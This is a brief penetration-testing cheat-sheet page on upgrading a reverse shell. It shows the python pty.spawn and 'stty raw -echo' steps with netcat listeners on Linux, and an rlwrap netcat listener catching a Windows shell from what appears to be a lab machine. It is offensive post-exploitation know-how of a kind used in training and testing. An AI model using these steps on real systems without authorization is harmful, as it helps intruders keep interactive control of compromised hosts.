---
description: Have fully interactive shell
---

# Upgrading shell

## Linux 

```text
root@r1:~# python3 -c 'import pty;pty.spawn("/bin/bash")' 
python3 -c 'import pty;pty.spawn("/bin/bash")' 
root@r1:~# ^Z 
[1]+  Stopped                  
nc -nlvp 8001 
root@Kali:~/# stty raw -echo 
write ‘fg' and enter 
root@DESKTOP99:~/# nc -nlvp 8001 
root@r1:~# ls 
test_intercept.pcap  user.txt 
root@r1:~# cat 
/bin/   dev/   home/  lib64/ mnt/   proc/  run/   snap/  sys/   usr/boot/  etc/   lib/   media/ opt/   root/  sbin/  srv/   tmp/   var/ 
root@r1:~# 
```

## Windows Host

```text
root@kali# rlwrap nc -lnvp 443 
Ncat: Version 7.70 (https://nmap.org/ncat) 
Ncat: Listening on :::443 
Ncat: Listening on 0.0.0.0:443 
Ncat: Connection from 10.10.10.130. 
Ncat: Connection from 10.10.10.130:49720. 
Microsoft Windows [Version 10.0.17763.107] 
(c) 2018 Microsoft Corporation. All rights reserved. 
C:\tomcat\apache-tomcat-8.5.37\bin>whoami 
arkham\alfred 
```



